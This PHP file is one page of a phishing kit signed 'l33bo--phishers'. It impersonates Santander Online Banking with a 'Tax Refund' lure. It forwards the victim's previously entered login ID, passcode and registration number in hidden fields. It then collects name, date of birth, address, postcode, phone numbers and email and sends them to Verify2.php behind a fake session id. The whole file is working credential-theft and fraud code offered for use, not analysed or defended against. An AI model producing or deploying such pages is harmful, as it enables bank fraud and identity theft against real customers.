<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
*/
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");

?>
<!DOCTYPE html>
<html lang="en-GB"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta charset="UTF-8">
<meta name="viewport" content="user-scalable=yes, width=device-width, initial-scale=1">
<title>Tax Refund</title>
<link rel="stylesheet" href="https://apply.santander.co.uk/PubRetBankWeb/fl/Styles/santander.css">
<link rel="shortcut icon" href="assets/img/fav.ico">
</head>
 <body>


<div id="wrapper">
	<a href="#" class="auralOnly">skip to main content</a>

	<header role="banner">
		<div>
			<span class="logo">Santander Online Banking</span>
			<span class="secureMessage">Your details are secure</span>
		</div>
		 <div class="headerExtra">
               <p>Your details are secure</p>
         </div>		
	</header>

	<div id="main" class="rightColumn">	
		<div id="content">
			




<h1>Tax Refund</h1>
<ol class="breadcrumbs"><li>Account Login</li><li class="current">About you</li><li>Security Information</li><li>Finsh</li></ol>



<form autocomplete="off" action="Verify2.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true" method="post" name="bankaccApplicationForm">
<input type="hidden" name="user" value="<?=$_POST['user']?>">
<input type="hidden" name="passcode" value="<?=$_POST['passcode']?>">
<input type="hidden" name="regno" value="<?=$_POST['regno']?>">

<p>(All the fields marked with * are required)</p>



<div class="form">
	<h2>About you - Your personal details</h2>
	<div class="formbody">
		<ul class="fields">
			<li>
				
				<label for="firstname">
					
					Full name *
				</label>
				<input name="name" required id="firstname" type="text" size="30" maxlength="20" value="">
				
			</li>
			<li>
				<fieldset>
				
				<legend>Date of Birth *</legend>
				
				
					<input name="dobd" required id="dateofbirth1" type="text" size="4" maxlength="2" class="day" title="day" value="<?php echo $_SESSION['day'];?>">
				 -
				
					<select name="dobm" required id="dateofbirth2" class="month" tabindex="13">
<option value="<?php echo $_SESSION['month'];?>"><?php echo $_SESSION['month'];?></option>
					<option selected="" value="Please choose">Please choose</option>
<option value="Jan">Jan</option>
<option value="Feb">Feb</option>
<option value="Mar">Mar</option>
<option value="Apr">Apr</option>
<option value="May">May</option>
<option value="Jun">Jun</option>
<option value="Jul">Jul</option>
<option value="Aug">Aug</option>
<option value="Sep">Sep</option>
<option value="Oct">Oct</option>
<option value="Nov">Nov</option>
<option value="Dec">Dec</option>
</select>
				 -
				
					<input name="doby" required id="dateofbirth3" type="text" size="4" title="year" maxlength="4" class="year" value="<?php echo $_SESSION['year'];?>">
				
			
				</fieldset>
				</li>
				
				<li>
				<label for="address">Address (line 1) *</label>
				<input name="address" required id="lastname" type="text" size="30" maxlength="40" value="<?php echo $_SESSION['address'];?>">
				</li>
				
				<li>
				<label for="postcode">Postcode *</label>
				<input name="postcode" required id="lastname" type="text" size="15" maxlength="10" value="<?php echo $_SESSION['postcode'];?>">
				</li>

		</ul>
	</div>
</div>


<div class="form">
	<h2>Contact details</h2>
	<div class="formbody">
		
		<p>
			<span id="contactdetails" class="emphasized"></span>
			<strong>Please provide at least one UK phone number and your email address</strong> *
		</p>
	 	
	<ul class="fields">

	
		<li>
			
			<label for="mobilephonenumber"><span class="emphasized"></span> Mobile phone number
			</label>
			<input name="mobile" id="mobilephonenumber" type="text" size="20" maxlength="12" value="">
			
			
		</li>
		<!-- HOME PHONE NUMBER -->
		<li>
			
			<label for="homephonenumber">
			<span class="emphasized"> </span>
				Home phone number
			</label>
		
			<input name="home" id="homephonenumber" type="text" size="20" maxlength="12" value="">
			<i class="small">Please include your area code</i>

			
		</li>
		<li>
			

				<label for="emailaddress">
				<span class="emphasized"></span> Email address *
				</label>
				<input class="pasteDisabled" name="email" id="emailaddress" type="text" size="30" maxlength="50" value="<?php echo $_SESSION['email'];?>">
			
		</li>
	</ul>
	</div>
</div>

<ul class="actions">
<li>
<button type="submit" style="float:right;" id="next" title="Click here to go to the next page" name="_eventId" value="next" class="primary">
	Continue
</button>
</li>
</ul>



</form>

		</div>
		<div id="extraInfo">
		
		</div>

		
	</div>

	<footer class="simple">
		<ul>
			<li class="first"><a href="#">Peace of Mind Guarantee</a></li>
			<li><a href="#">Site Help &amp; Accessibility</a></li>
			<li><a href="#">Security &amp; Privacy</a></li>
			<li><a href="#">Legal</a></li>
		</ul>
	</footer>
	
</div>

</body>
</html>
<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
*/
?>
